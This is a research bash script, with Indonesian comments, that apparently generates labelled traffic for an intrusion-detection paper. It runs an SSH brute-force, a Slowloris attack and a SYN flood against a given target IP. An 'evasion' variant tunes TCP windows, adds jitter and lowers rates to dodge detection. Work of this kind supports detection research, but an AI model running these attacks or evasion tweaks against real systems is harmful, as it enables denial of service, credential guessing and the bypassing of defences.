#!/bin/bash
# ============================================================
# Paper 2 (Adversarial) - Skenario serangan di AWS, dari Attacker.
# Pola timeline SAMA dengan Paper 1 (~7 menit) agar ground-truth cocok:
#   0-1 mnt benign | 1-3 SSH brute | 3-5 Slowloris | 5-6 SYN flood | 6-7 benign
#
# Dua varian (network-level evasion yang REALISTIS - dapat dikirim di jaringan):
#   clean    : serangan standar (pembanding).
#   evasion  : sama, TETAPI dengan perturbasi level-jaringan yang menggeser
#              fitur flow secara ALAMI (bukan FGSM feature-space):
#                - TCP window size dikecilkan (ubah Init Win Byts / packet-shape)
#                - jitter tc netem 10ms +/-5ms (ubah IAT/timing)
#                - rate & concurrency dikurangi ~50% (ubah src_load/dst_load, pkts/s)
#              Ini "functional-preserving" alami: flow tetap valid & terkirim.
#
# Usage (di Attacker):
#   ./adv-attack-scenario.sh <TARGET_PRIVATE_IP> [clean|evasion]
# ============================================================
set -x
TARGET=$1
VARIANT=${2:-clean}
[ -z "$TARGET" ] && { echo "Usage: $0 <TARGET_IP> [clean|evasion]"; exit 1; }
IFACE=$(ip -o -4 route show to default | awk '{print $5}' | head -1)

# Parameter serangan per-varian (evasion = lebih pelan/senyap).
if [ "$VARIANT" = "evasion" ]; then
  echo "[EVASION] mengaktifkan perturbasi network-level pada $IFACE"
  # 1) kecilkan TCP window (ubah packet-shape / Init Win Byts)
  sudo sysctl -w net.ipv4.tcp_window_scaling=0 >/dev/null 2>&1 || true
  sudo sysctl -w net.ipv4.tcp_rmem="4096 16384 32768" >/dev/null 2>&1 || true
  sudo sysctl -w net.ipv4.tcp_wmem="4096 16384 32768" >/dev/null 2>&1 || true
  # 2) jitter (ubah IAT/timing)
  sudo tc qdisc add dev "$IFACE" root netem delay 10ms 5ms distribution normal 2>/dev/null || \
  sudo tc qdisc change dev "$IFACE" root netem delay 10ms 5ms distribution normal 2>/dev/null || true
  SSH_T=2;  SSH_W=10          # thread lebih rendah, wait lebih lama
  SLOW_S=50                   # socket lebih sedikit
  SYN_RATE=100; SYN_CNT=6000  # rate lebih rendah
else
  SSH_T=4;  SSH_W=0
  SLOW_S=100
  SYN_RATE=200; SYN_CNT=12000
fi

echo "[$(date +%T)] Fase 0: benign warm-up (60s)  [$VARIANT]"
for i in $(seq 1 60); do curl -s "http://$TARGET/" >/dev/null; sleep 1; done

echo "[$(date +%T)] Fase 1: SSH brute-force (120s)  t=$SSH_T w=$SSH_W"
if command -v hydra >/dev/null; then
  if [ "$SSH_W" -gt 0 ]; then
    timeout 120 hydra -l testuser -P /opt/passwords.txt -t $SSH_T -w $SSH_W "$TARGET" ssh 2>&1 | tail -2 || true
  else
    timeout 120 hydra -l testuser -P /opt/passwords.txt -t $SSH_T "$TARGET" ssh 2>&1 | tail -2 || true
  fi
else
  timeout 120 bash -c "while true; do sshpass -p wrong ssh -o StrictHostKeyChecking=no testuser@$TARGET true 2>/dev/null; done" || true
fi

echo "[$(date +%T)] Fase 2: Slowloris (120s)  sockets=$SLOW_S"
timeout 120 slowloris "$TARGET" -p 80 -s $SLOW_S 2>&1 | tail -2 || true

echo "[$(date +%T)] Fase 3: SYN flood (60s)  rate=$SYN_RATE"
sudo timeout 60 nping --tcp --flags SYN --rate $SYN_RATE -p 80 -c $SYN_CNT "$TARGET" 2>&1 | tail -3 || true

echo "[$(date +%T)] Fase 4: benign cool-down (60s)"
for i in $(seq 1 60); do curl -s "http://$TARGET/" >/dev/null; sleep 1; done

# --- Kembalikan network settings bila evasion ---
if [ "$VARIANT" = "evasion" ]; then
  echo "[EVASION] mengembalikan network settings"
  sudo sysctl -w net.ipv4.tcp_window_scaling=1 >/dev/null 2>&1 || true
  sudo sysctl -w net.ipv4.tcp_rmem="4096 131072 6291456" >/dev/null 2>&1 || true
  sudo sysctl -w net.ipv4.tcp_wmem="4096 16384 4194304" >/dev/null 2>&1 || true
  sudo tc qdisc del dev "$IFACE" root netem 2>/dev/null || true
fi

echo "[$(date +%T)] SELESAI ($VARIANT)."
echo "Timeline ground-truth: 0-1 benign | 1-3 attack | 3-5 attack | 5-6 attack | 6-7 benign"
echo "Next: Target -> stop capture -> jalankan adv-extract-infer.py di analyzer."
